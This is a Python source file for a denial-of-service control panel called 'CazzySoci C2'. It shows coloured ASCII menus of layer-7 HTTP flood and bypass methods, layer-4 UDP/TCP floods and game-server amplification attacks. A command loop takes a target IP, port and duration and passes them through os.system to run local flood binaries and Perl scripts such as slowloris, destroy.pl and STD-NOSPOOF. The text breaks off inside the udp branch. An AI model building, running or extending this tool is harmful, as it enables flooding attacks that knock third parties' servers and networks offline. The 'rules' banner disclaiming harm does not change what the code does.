import socket
import os
import requests
import random
import getpass
import time
import sys

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

proxys = open('proxy.txt').readlines()
bots = len(proxys)

def ascii_vro():
    clear()
    print(f'''
     / **/|        
     | == /        
      |  |         
      |  |         
      |  /         
       |/  







    ''')
    time.sleep(0.6)
    clear()
    print(f'''



     / **/|        
     | == /        
      |  |         
      |  |         
      |  /         
       |/  


    ''')
    time.sleep(0.6)
    clear()
    print(f'''







     / **/|        
     | == /        
      |  |                  

    ''')
    time.sleep(0.6)
    clear()
    print(f"""

     _.-^^---....,,--       
 _--                  --_  
<                        >)
|                         | 
 \._                   _./  
    ```--. . , ; .--'''       
          | |   |             
       .-=||  | |=-.   
       `-=#$%&%$#=-'   
          | ;  :|     
 _____.,-#%&$@%#&#~,._____
    """)
    time.sleep(0.8)
    clear()

def si():
    print('         \x1b\033[0;34m[ \x1b[38;2;233;233;233mCazzySoci \x1b\033[0;34m] | \x1b[38;2;233;233;233mWelcome to CazzySociC2! \x1b\033[0;34m| \x1b[38;2;233;233;233mOwner: CazzySoci \x1b\033[0;34m| \x1b[38;2;233;233;233mUpdate v3.0')
    print("")

def tools():
    clear()
    si()
    print(f'''
                                \x1b\033[0;31m╔═══════════════╗
                                \x1b\033[0;31m║     \x1b\033[0;31mTools     \x1b\033[0;31m║
                \x1b\033[0;31m╔═══════════════╩══════╦════════╩═══════════════╗
                \x1b\033[0;31m║  \x1b\033[0;31mgeoip               \x1b\033[0;31m║  \x1b\033[0;31mreverse-dns           \x1b\033[0;31m║
                \x1b\033[0;31m║  \x1b\033[0;31mreverseip           \x1b\033[0;31m║  \x1b\033[0;31m<empty>               \x1b\033[0;31m║  
                \x1b\033[0;31m║  \x1b\033[0;31msubnet-lookup       \x1b\033[0;31m║  \x1b\033[0;31m<empty>               \x1b\033[0;31m║
                \x1b\033[0;31m║  \x1b\033[0;31masn-lookup          \x1b\033[0;31m║  \x1b\033[0;31m<empty>               \x1b\033[0;31m║
                \x1b\033[0;31m║  \x1b\033[0;31mdns-lookup          \x1b\033[0;31m║  \x1b\033[0;31m<empty>               \x1b\033[0;31m║
                \x1b\033[0;31m╚══════════════════════╩════════════════════════╝

          
''')
    

def rules():
    clear()
    si()
    print(f'''
                                \x1b[\033[0;34m╔═══════════════╗
                                \x1b[\033[0;34m║     \x1b[38;2;0;255;255mRules     \x1b[\033[0;34m║
                \x1b[\033[0;34m╔═══════════════╩═══════════════╩═══════════════╗
                \x1b[\033[0;34m║ \x1b[38;2;0;255;255m2. Do not attack .gov/.gob/.edu/.mil domains  \x1b[\033[0;34m║
                \x1b[\033[0;34m║ \x1b[38;2;0;255;255m7. The creator does not do any harm           \x1b[\033[0;34m║
                \x1b[\033[0;34m╚═══════════════════════════════════════════════╝

          
''')

def ports():
    clear()
    si()
    print(f'''
                                \x1b[38;2;0;212;14m╔═══════════════╗
                                \x1b[38;2;0;212;14m║     \x1b[38;2;0;255;255mPorts     \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m╔═══════════════╩═══════════════╩═══════════════╗
                \x1b[38;2;0;212;14m║ \x1b[38;2;0;212;14m21 - \x1b[38;2;0;255;255mSFTP       \x1b[38;2;0;212;14m69   - \x1b[38;2;0;255;255mTFTP      \x1b[38;2;0;212;14m5060  - \x1b[38;2;0;255;255mRIP  \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m║ \x1b[38;2;0;212;14m22 - \x1b[38;2;0;255;255mSSH        \x1b[38;2;0;212;14m80   - \x1b[38;2;0;255;255mHTTP      \x1b[38;2;0;212;14m30120 - \x1b[38;2;0;255;255mFIVEM\x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m║ \x1b[38;2;0;212;14m23 - \x1b[38;2;0;255;255mTELNET     \x1b[38;2;0;212;14m443  - \x1b[38;2;0;255;255mHTTPS                  \x1b[38;2;0;212;14m║   
                \x1b[38;2;0;212;14m║ \x1b[38;2;0;212;14m25 - \x1b[38;2;0;255;255mSMTP       \x1b[38;2;0;212;14m3074 - \x1b[38;2;0;255;255mXBOX                   \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m║ \x1b[38;2;0;212;14m53 - \x1b[38;2;0;255;255mDNS        \x1b[38;2;0;212;14m5060 - \x1b[38;2;0;255;255mPLAYSATION             \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m║ \x1b[38;2;0;212;14m25 - \x1b[38;2;0;255;255mMINECRAFT  \x1b[38;2;0;212;14m25565 - \x1b[38;2;0;255;255mMINECRAFT             \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m╚═══════════════════════════════════════════════╝

          
''')

def special():
    clear()
    si()
    print(f'''
                                \x1b[38;2;0;212;14m╔═══════════════╗
                                \x1b[38;2;0;212;14m║    \x1b[38;2;0;255;255mSpecial    \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m╔═══════════════╩══════╦════════╩═══════════════╗
                \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255mstress              \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m<empty>               \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255mspike               \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m<empty>               \x1b[38;2;0;212;14m║  
                \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m<empty>             \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m<empty>               \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m<empty>             \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m<empty>               \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m<empty>             \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m<empty>               \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m╚══════════════════════╩════════════════════════╝

          
''')
    
def layer7():
    clear()
    si()
    print(f'''
   \x1b\033[0;32m⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀                              ⠀⠀⠀ ⠀ ⠀⣀⡠⢤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀                      \x1b\033[0;32m   
⠀⠀⠀\x1b\033[0;32m⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀                              ⢀⡴⠟⠃⠀⠀⠙⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀                      \x1b\033[0;32m
⠀⠀⠀\x1b\033[0;32m⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀                              ⠀⣠⠋⠀⠀⠀⠀⠀⠀⠘⣆⠀⠀⠀⠀⠀⠀⠀⠀                       \x1b\033[0;32m
⠀⠀⠀\x1b\033[0;32m⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀                              ⠀⢠⠾⢛⠒⠀⠀⠀⠀⠀⠀⠀⢸⡆⠀⠀⠀⠀⠀⠀⠀                       \x1b\033[0;32m
⠀⠀⠀\x1b\033[0;32m⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀                              ⠀⠀⠀⠀⠀⣿⣶⣄⡈⠓⢄⠠⡀⠀⠀⠀⣄⣷⠀⠀⠀⠀⠀⠀⠀                       \x1b\033[0;32m
⠀⠀⠀\x1b\033[0;32m⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀                              ⢀⣿⣷⠀⠈⠱⡄⠑⣌⠆⠀⠀⡜⢻⠀⠀⠀⠀⠀⠀⠀                       \x1b\033[0;32m
⠀⠀⠀\x1b\033[0;32m⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀                              ⠀⠀⠀⢸⣿⡿⠳⡆⠐⢿⣆⠈⢿⠀⠀⡇⠘⡆⠀⠀⠀⠀⠀⠀                       \x1b\033[0;32m
⠀⠀⠀\x1b\033[0;32m⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀                              ⠀⠀⠀⠀⠀⢿⣿⣷⡇⠀⠀⠈⢆⠈⠆⢸⠀⠀⢣⠀⠀⠀⠀⠀⠀                       \x1b\033[0;32m
⠀⠀⠀\x1b\033[0;32m                                                       ⠀⠀⠀ ⠀⠀⠘⣿⣿⣿⣧⠀⠀⠈⢂⠀⡇⠀⠀⢨⠓⣄⠀⠀⠀⠀                        \x1b\033[0;32m
⠀⠀⠀\x1b\033[0;32m⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀                             ⠀⠀⠀⠀⠀⠀ ⠀⠀⣸⣿⣿⣿⣦⣤⠖⡏⡸⠀⣀⡴⠋⠀⠈⠢⡀⠀⠀                        \x1b\033[0;32m
⠀⠀⠀\x1b\033[0;32m⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀                                       ⠀⢠⣾⠁⣹⣿⣿⣿⣷⣾⠽⠖⠊⢹⣀⠄⠀⠀⠀⠈⢣⡀                       \x1b\033[0;32m
⠀⠀⠀\x1b\033[0;32m⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀                              ⠀⠀⠀⠀⠀⠀⠀⠀⠀⡟⣇⣰⢫⢻⢉⠉⠀⣿⡆⠀⠀⡸⡏⠀⠀⠀⠀⠀⠀⢇                        \x1b\033[0;32m
⠀⠀⠀\x1b\033[0;32m⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀                              ⠀⠀⠀⠀⠀⠀⠀⠀⠀⢨⡇⡇⠈⢸⢸⢸⠀⠀⡇⡇⠀⠀⠁⠻⡄⡠⠂⠀⠀⠀⠘                        \x1b\033[0;32m
    \x1b\033[0;32m                          ⢤⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠛⠓⡇⠀⠸⡆⢸⠀⢠⣿⠀⠀⠀⠀⣰⣿⣵⡆⠀⠀⠀⠀                        \x1b\033[0;32m
    \x1b\033[0;32m                          ⠈⢻⣷⣦⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⡿⣦⣀⡇⠀⢧⡇⠀⠀⢺⡟⠀⠀⠀⢰⠉⣰⠟⠊⣠⠂⠀⡸                       \x1b\033[0;32m
⠀   \x1b\033[0;32m                           ⠀⢻⣿⣿⣷⣦⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⢧⡙⠺⠿⡇⠀⠘⠇⠀⠀⢸⣧⠀⠀⢠⠃⣾⣌⠉⠩⠭⠍⣉⡇                      \x1b\033[0;32m
⠀⠀  \x1b\033[0;32m                            ⠀⠻⣿⣿⣿⣿⣿⣦⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣞⣋⠀⠈⠀⡳⣧⠀⠀⠀⠀⠀⢸⡏⠀⠀⡞⢰⠉⠉⠉⠉⠉⠓⢻⠃                      \x1b\033[0;32m
⠀⠀⠀\x1b\033[0;32m                              ⠀⠹⣿⣿⣿⣿⣿⣿⣷⡄⠀⠀⢀⣀⠠⠤⣤⣤⠤⠞⠓⢠⠈⡆⠀⢣⣸⣾⠆⠀⠀⠀⠀⠀⢀⣀⡼⠁⡿⠈⣉⣉⣒⡒⠢⡼⠀                    \x1b\033[0;32m
⠀⠀⠀\x1b\033[0;32m                              ⠀⠀⠘⣿⣿⣿⣿⣿⣿⣿⣎⣽⣶⣤⡶⢋⣤⠃⣠⡦⢀⡼⢦⣾⡤⠚⣟⣁⣀⣀⣀⣀⠀⣀⣈⣀⣠⣾⣅⠀⠑⠂⠤⠌⣩⡇⠀                   \x1b\033[0;32m
⠀⠀⠀\x1b\033[0;32m⠀⠀                              ⠀⠘⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡁⣺⢁⣞⣉⡴⠟⡀⠀⠀⠀⠁⠸⡅⠀⠈⢷⠈⠏⠙⠀⢹⡛⠀⢉⠀⠀⠀⣀⣀⣼⡇⠀                    \x1b\033[0;32m
⠀⠀⠀\x1b\033[0;32m ⠀                             ⠀⠀⠀⠈⠻⣿⣿⣿⣿⣿⣿⣿⣿⣽⣿⡟⢡⠖⣡⡴⠂⣀⣀⣀⣰⣁⣀⣀⣸⠀⠀⠀⠀⠈⠁⠀⠀⠈⠀⣠⠜⠋⣠⠁⠀                     \x1b\033[0;32m
⠀⠀⠀\x1b\033[0;32m⠀⠀⠀⠀⠀⠀⠀                            ⠀⠙⢿⣿⣿⣿⡟⢿⣿⣿⣷⡟⢋⣥⣖⣉⠀⠈⢁⡀⠤⠚⠿⣷⡦⢀⣠⣀⠢⣄⣀⡠⠔⠋⠁⠀⣼⠃⠀⠀                     \x1b\033[0;32m
⠀⠀\x1b\033[0;32m⠀⠀⠀⠀⠀⠀⠀⠀                            ⠀⠀⠀⠈⠻⣿⣿⡄⠈⠻⣿⣿⢿⣛⣩⠤⠒⠉⠁⠀⠀⠀⠀⠀⠉⠒⢤⡀⠉⠁⠀⠀⠀⠀⠀⢀⡿⠀⠀⠀                        \x1b\033[0;32m
⠀⠀\x1b\033[0;32m⠀⠀⠀⠀⠀⠀⠀⠀⠀                            ⠀⠀⠀⠀⠈⠙⢿⣤⣤⠴⠟⠋⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠑⠤⠀⠀⠀⠀⠀⢩⠇⠀⠀⠀                         \x1b\033[0;32m
⠀⠀\x1b\033[0;32m⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀                            ⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀                           \x1b\033[0;32m

          
\x1b\033[0;31m      (                  )       (                          \x1b\033[0;31m
\x1b\033[0;31m      )\ )    (       ( /(       )\ )     )                 \x1b\033[0;31m
\x1b\033[0;31m     (()/(    )\      )\()) (   (()/(  ( /(                 \x1b\033[0;31m
\x1b\033[0;31m      /(_))((((_)(   ((_)\  )\   /(_)) )\())                \x1b\033[0;31m
\x1b\033[0;31m     (_))   )\ _ )\ __ ((_)((_) (_))  ((_)\                 \x1b\033[0;31m
\x1b\033[0;31m     | |    (_)_\(_)\ \ / /| __|| _ \|__  /                 \x1b\033[0;31m
\x1b\033[0;31m     | |__   / _ \   \ V / | _| |   /  / /                  \x1b\033[0;31m
\x1b\033[0;31m     |____| /_/ \_\   |_|  |___||_|_\ /_/                   \x1b\033[0;31m

\x1b[38;2;0;83;168m╔═══════════════════════╦═════════════════════╗
\x1b[38;2;0;83;168m║   \x1b[38;2;0;255;255mhttp-raw            \x1b[38;2;0;83;168m║   \x1b[38;2;0;255;255mcrash             \x1b[38;2;0;83;168m║
\x1b[38;2;0;83;168m║   \x1b[38;2;0;255;255mhttp-socket         \x1b[38;2;0;83;168m║   \x1b[38;2;0;255;255mhttpflood         \x1b[38;2;0;83;168m║
\x1b[38;2;0;83;168m║   \x1b[38;2;0;255;255mhttp-storm          \x1b[38;2;0;83;168m║   \x1b[38;2;0;255;255mcf-socket         \x1b[38;2;0;83;168m║
\x1b[38;2;0;83;168m║   \x1b[38;2;0;255;255mhttp-rand           \x1b[38;2;0;83;168m║   \x1b[38;2;0;255;255mcf-pro            \x1b[38;2;0;83;168m║
\x1b[38;2;0;83;168m║   \x1b[38;2;0;255;255moverflow            \x1b[38;2;0;83;168m║   \x1b[38;2;0;255;255mhyper             \x1b[38;2;0;83;168m║
\x1b[38;2;0;83;168m║   \x1b[38;2;0;255;255mbypass2             \x1b[38;2;0;83;168m║   \x1b[38;2;0;255;255mslow              \x1b[38;2;0;83;168m║
\x1b[38;2;0;83;168m║   \x1b[38;2;0;255;255muambypass           \x1b[38;2;0;83;168m║   \x1b[38;2;0;255;255mgetaway           \x1b[38;2;0;83;168m║
\x1b[38;2;0;83;168m║   \x1b[38;2;0;255;255movh-raw             \x1b[38;2;0;83;168m║   \x1b[38;2;0;255;255movh-beam          \x1b[38;2;0;83;168m║
\x1b[38;2;0;83;168m║   \x1b[38;2;0;255;255mspike               \x1b[38;2;0;83;168m║   \x1b[38;2;0;255;255mhttpget           \x1b[38;2;0;83;168m║
\x1b[38;2;0;83;168m║   \x1b[38;2;0;255;255mhttp-requests       \x1b[38;2;0;83;168m║   \x1b[38;2;0;255;255mhttpskill         \x1b[38;2;0;83;168m║
\x1b[38;2;0;83;168m║   \x1b[38;2;0;255;255mcfstrong            \x1b[38;2;0;83;168m║   \x1b[38;2;0;255;255mmix               \x1b[38;2;0;83;168m║
\x1b[38;2;0;83;168m║   \x1b[38;2;0;255;255mtlsbypass           \x1b[38;2;0;83;168m║   \x1b[38;2;0;255;255mstroke            \x1b[38;2;0;83;168m║
\x1b[38;2;0;83;168m║   \x1b[38;2;0;255;255mbypass              \x1b[38;2;0;83;168m║   \x1b[38;2;0;255;255mcsnuke            \x1b[38;2;0;83;168m║
\x1b[38;2;0;83;168m║   \x1b[38;2;0;255;255mcsraw               \x1b[38;2;0;83;168m║   \x1b[38;2;0;255;255mhold              \x1b[38;2;0;83;168m║
\x1b[38;2;0;83;168m╚═══════════════════════╩═════════════════════╝


''')

def layer4():
    clear()
    si()
    print(f'''
                \x1b[\033[0;31m
                \x1b[\033[0;31m                                                         _..--""---.                                               \x1b[\033[0;31m
                \x1b[\033[0;31m                                                        /           ".                                             \x1b[\033[0;31m
                \x1b[\033[0;31m                                                        `            l                                             \x1b[\033[0;31m
                \x1b[\033[0;31m                                                        |'._  ,._ l/"\                                             \x1b[\033[0;31m
                \x1b[\033[0;31m                                                        |  _J<__/.v._/                                             \x1b[\033[0;31m
                \x1b[\033[0;31m                                                         \( ,~._,,,,-)                                             \x1b[\033[0;31m
                \x1b[\033[0;31m                                                          `-\' \`,,j|                                              \x1b[\033[0;31m
                \x1b[\033[0;31m                                                            \_,____J                                               \x1b[\033[0;31m
                \x1b[\033[0;31m                                                        .--.__)--(__.--.                                           \x1b[\033[0;31m
                \x1b[\033[0;31m                                                       /  `-----..--'. j                                           \x1b[\033[0;31m
                \x1b[\033[0;31m                                                       '.- '`--` `--' \\                                           \x1b[\033[0;31m
                \x1b[\033[0;31m                                                      //  '`---'`  `-' \\                                          \x1b[\033[0;31m
                \x1b[\033[0;31m                                                     //   '`----'`.-.-' \\                                         \x1b[\033[0;31m
                \x1b[\033[0;31m                                                    _//     `--- -'   \' | \________                               \x1b[\033[0;31m
                \x1b[\033[0;31m                                                   |  |         ) (      `.__.---- -'\                             \x1b[\033[0;31m
                \x1b[\033[0;31m                                                   \7          \`-(               74\\\                            \x1b[\033[0;31m
                \x1b[\033[0;31m                                                   ||       _  /`-(               l|//7__                          \x1b[\033[0;31m
                \x1b[\033[0;31m                                                   |l    ('  `-)-/_.--.          f''` -.-"|                        \x1b[\033[0;31m
                \x1b[\033[0;31m                                                   |\     l\_  `-'    .'         |     |  |                        \x1b[\033[0;31m
                \x1b[\033[0;31m                                                   llJ   _ _)J--._.-('           |     |  l                        \x1b[\033[0;31m
                \x1b[\033[0;31m                                                   |||( ( '_)_  .l   ". _    ..__I     |  L                        \x1b[\033[0;31m
                \x1b[\033[0;31m                                                   ^\\\||`'   "   '"-. " )''`'---'     L.-'`-.._                   \x1b[\033[0;31m
                \x1b[\033[0;31m                                                        \ |           ) /.              ``'`-.._``-.               \x1b[\033[0;31m
                \x1b[\033[0;31m                                                        l l          / / |                      |''|               \x1b[\033[0;31m
                \x1b[\033[0;31m                                                         " \        / /   "-..__                |  |               \x1b[\033[0;31m
                \x1b[\033[0;31m                                                         | |       / /          1       ,- t-...J_.'               \x1b[\033[0;31m
                \x1b[\033[0;31m                                                         | |      / /           |       |  |                       \x1b[\033[0;31m
                \x1b[\033[0;31m                                                         J  \  /"  (            l       |  |                       \x1b[\033[0;31m
                \x1b[\033[0;31m                                                         | ().'`-()/            |       |  |                       \x1b[\033[0;31m
                \x1b[\033[0;31m                                                        _.-"_.____/             l       l.-l                       \x1b[\033[0;31m
                \x1b[\033[0;31m                                                    _.-"_.+"|                  /        \.  \                      \x1b[\033[0;31m
                \x1b[\033[0;31m                                               /"\.-"_.-" | |                 /          \   \                     \x1b[\033[0;31m
                \x1b[\033[0;31m                                               \_   "     | |                1            | `'|                    \x1b[\033[0;31m
                \x1b[\033[0;31m                                                 |ll      | |                |            i   |                    \x1b[\033[0;31m
                \x1b[\033[0;31m                                                  \\\      |-\               \j ..          L,,'. `/                \x1b[\033[0;31m
                \x1b[\033[0;31m                                                 __\\\     ( .-\           .--'    ``--../..'      '-..             \x1b[\033[0;31m
               
\x1b[\033[0;34m    .____        _____  _____.___._____________________        _____   
\x1b[\033[0;34m    |    |      /  _  \ \__  |   |\_   _____/\______   \      /  |  |                             \x1b[\033[0;34m
\x1b[\033[0;34m    |    |     /  /_\  \ /   |   | |    __)_  |       _/     /   |  |_                            \x1b[\033[0;34m
\x1b[\033[0;34m    |    |___ /    |    \\____   | |        \ |    |   \     /    ^   /                           \x1b[\033[0;34m
\x1b[\033[0;34m    |_______ \\____|__  // ______|/_______  / |____|_  /     \____   |                            \x1b[\033[0;34m
\x1b[\033[0;34m            \/        \/ \/               \/         \/          |__|                             \x1b[\033[0;34m
          

    \x1b[\033[1;35m╔═══════════════════════╦═════════════════════╗
    \x1b[\033[1;35m║   \x1b[38;2;0;255;255mudp                 \x1b[\033[1;35m║   \x1b[38;2;0;255;255mtcp               \x1b[\033[1;35m║
    \x1b[\033[1;35m║   \x1b[38;2;0;255;255mnfo-killer          \x1b[\033[1;35m║   \x1b[38;2;0;255;255mstd               \x1b[\033[1;35m║
    \x1b[\033[1;35m║   \x1b[38;2;0;255;255mudpbypass           \x1b[\033[1;35m║   \x1b[38;2;0;255;255mdestroy           \x1b[\033[1;35m║
    \x1b[\033[1;35m║   \x1b[38;2;0;255;255mhome                \x1b[\033[1;35m║   \x1b[38;2;0;255;255mupl               \x1b[\033[1;35m║
    \x1b[\033[1;35m║   \x1b[38;2;0;255;255mslowloris           \x1b[\033[1;35m║   \x1b[38;2;0;255;255mflux              \x1b[\033[1;35m║
    \x1b[\033[1;35m║   \x1b[38;2;0;255;255mstdv2               \x1b[\033[1;35m║   \x1b[38;2;0;255;255mdns               \x1b[\033[1;35m║
    \x1b[\033[1;35m║   \x1b[38;2;0;255;255mcsamp               \x1b[\033[1;35m║   \x1b[38;2;0;255;255mcsbrutal          \x1b[\033[1;35m║
    \x1b[\033[1;35m║   \x1b[38;2;0;255;255mautobypass          \x1b[\033[1;35m║   \x1b[38;2;0;255;255m<soon>            \x1b[\033[1;35m║
    \x1b[\033[1;35m╚═══════════════════════╩═════════════════════╝
              

''')

def amp_games():
    clear()
    si()
    print(f'''
                              \x1b\033[0;33m╔═══════════════╗
                              \x1b\033[0;33m║\x1b[38;2;0;255;255m AMP's \x1b\033[0;33m/ \x1b[38;2;0;255;255mGames \x1b\033[0;33m║
               \x1b\033[0;33m╔══════════════╩════════╦══════╩══════════════╗
               \x1b\033[0;33m║   \x1b[38;2;0;255;255movh-amp             \x1b\033[0;33m║   \x1b[38;2;0;255;255movh-amp           \x1b\033[0;33m║
               \x1b\033[0;33m║   \x1b[38;2;0;255;255mminecraft           \x1b\033[0;33m║   \x1b[38;2;0;255;255mstd               \x1b\033[0;33m║
               \x1b\033[0;33m║   \x1b[38;2;0;255;255msamp                \x1b\033[0;33m║   \x1b[38;2;0;255;255mldap              \x1b\033[0;33m║
               \x1b\033[0;33m║   \x1b[38;2;0;255;255m<empty>             \x1b\033[0;33m║   \x1b[38;2;0;255;255m<empty>           \x1b\033[0;33m║
               \x1b\033[0;33m╚═══════════════════════╩═════════════════════╝

          
''')


def menu():
    sys.stdout.write(f"         \x1b]2;CazzySoci C2 --> AnonBots: [{bots}] | Online Users: [1] | Methods: [37] | Bypass: [10] | Amps: [1]\x07")
    clear()
    print('\x1b\033[0;34m[ \x1b[38;2;233;233;233mCazzy \x1b\033[0;34m] | \x1b[38;2;233;233;233mWelcome to CazzySoci C2! \x1b\033[0;34m| \x1b[38;2;233;233;233mOwner: CazzySoci \x1b\033[0;34m| \x1b[38;2;233;233;233mUpdate v3.0')
    print("")
    print("""
                      \x1b\033[0;31m ╔═╗ \x1b\033[0;31m ┌─┐ \x1b\033[0;31m ┌─┐ \x1b\033[0;31m ┌─┐ \x1b\033[0;31m ┬ ┬ \x1b\033[0;31m ╔═┯ \x1b\033[0;31m  ╔┯┯╗
                      \x1b\033[0;31m ║   \x1b\033[0;31m ├─┤ \x1b\033[0;31m ┌─┘ \x1b\033[0;31m ┌─┘ \x1b\033[0;31m └┬┘ \x1b\033[0;31m ║   \x1b\033[0;31m  ╔══╝
                      \x1b\033[0;31m ╚═╝ \x1b\033[0;31m ┴ ┴ \x1b\033[0;31m └─┘ \x1b\033[0;31m └─┘ \x1b\033[0;31m  ┴  \x1b\033[0;31m ╚═┷ \x1b\033[0;31m  ╚┷┷╝
            \x1b\033[0;31m╔═══════\x1b\033[0;31m════════\x1b\033[0;31m═══════\x1b\033[0;31m═════\x1b\033[0;31m═════\x1b\033[0;31m═════\x1b\033[0;31m════\x1b\033[0;31m═══\x1b\033[0;31m════\x1b\033[0;31m══════╗
            \x1b\033[0;31m║ \x1b[38;2;239;239;239m • With great power, Comes with great responsibility \x1b\033[0;31m║
            \x1b\033[0;31m╚═══════\x1b\033[0;31m════════\x1b\033[0;31m═══════\x1b\033[0;31m═════\x1b\033[0;31m═════\x1b\033[0;31m\x1b\033[0;31m═══\x1b\033[0;31m═══\x1b\033[0;31m══════════\x1b\033[0;31m══════╝


""")

def main():
    menu()
    while(True):
        cnc = input('''\x1b\033[0;31m╔══[root\x1b\033[0;31m@Ca\x1b\033[0;31mzzy\x1b\033[0;31mC2\x1b\033[0;31m]
\x1b\033[0;31m╚\x1b\033[0;31m═\x1b\033[0;31m═\x1b\033[0;31m═\x1b\033[0;31m═\x1b\033[0;31m➤ \x1b\033[0;31m''')
        if cnc == "layer7" or cnc == "LAYER7" or cnc == "L7" or cnc == "l7":
            layer7()
        elif cnc == "layer4" or cnc == "LAYER4" or cnc == "L4" or cnc == "l4":
            layer4()
        elif cnc == "amp" or cnc == "AMP" or cnc == "amp/game" or cnc == "amps/game" or cnc == "amps/games" or cnc == "amp/games" or cnc == "AMP/GAME":
            amp_games()
        elif cnc == "special" or cnc == "SPECIAL" or cnc == "specialS" or cnc == "SPECIALS":
            special()
        elif cnc == "rule" or cnc == "RULES" or cnc == "rules" or cnc == "RULES" or cnc == "RULE34":
            rules()
        elif cnc == "clear" or cnc == "CLEAR" or cnc == "CLS" or cnc == "cls":
            main()
        elif cnc == "ports" or cnc == "port" or cnc == "PORTS" or cnc == "PORT":
            ports()
        elif cnc == "tools" or cnc == "tool" or cnc == "TOOLS" or cnc == "TOOL":
            tools()

# LAYER 4 METHODS   

        elif "autobypass" in cnc:
            try:
                tcp = cnc.split()[1]
                ip = cnc.split()[2]
                port = cnc.split()[3]
                time = cnc.split()[4]
                os.system(f'./AUTOBYPASS {tcp} {ip} {port} {time}')
            except IndexError:
                print('Usage: autobypass <tcp> <ip> <port> <time>')
                print('Example: autobypass tcp 1.1.1.1 80 10000')


        elif "flux" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                thread = cnc.split()[3]
                os.system(f'./flux {ip} {port} {thread} 0')
            except IndexError:
                print('Usage: flux <ip> <port> <threads>')
                print('Example: flux 1.1.1.1 80 250')

        elif "slowloris" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                os.system(f'./slowloris {ip} {port}')
            except IndexError:
                print('Usage: slowloris <ip> <port>')
                print('Example: slowloris 1.1.1.1 80')

        elif "upl" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                time = cnc.split()[3]
                os.system(f'perl upl.pl {ip} {port} 65535 {time}')
            except IndexError:
                print('Usage: upl <ip> <port> <time>')
                print('Example: upl 1.1.1.1 80 1000')

        elif "destroy" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                time = cnc.split()[3]
                os.system(f'perl destroy.pl {ip} {port} 65535 {time}')
            except IndexError:
                print('Usage: destroy <ip> <port> <time>')
                print('Example: destroy 1.1.1.1 80 60')

        elif "std" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                os.system(f'./STD-NOSPOOF {ip} {port}')
            except IndexError:
                print('Usage: std <ip> <port>')
                print('Example: std 1.1.1.1 80')

        elif "home" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                time = cnc.split()[3]
                os.system(f'perl home.pl {ip} {port} 65535 {time}')
            except IndexError:
                print('Usage: home <ip> <port> <time>')
                print('Example: home 1.1.1.1 80 60')

        elif "udp" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                packets = cnc.split()[3]
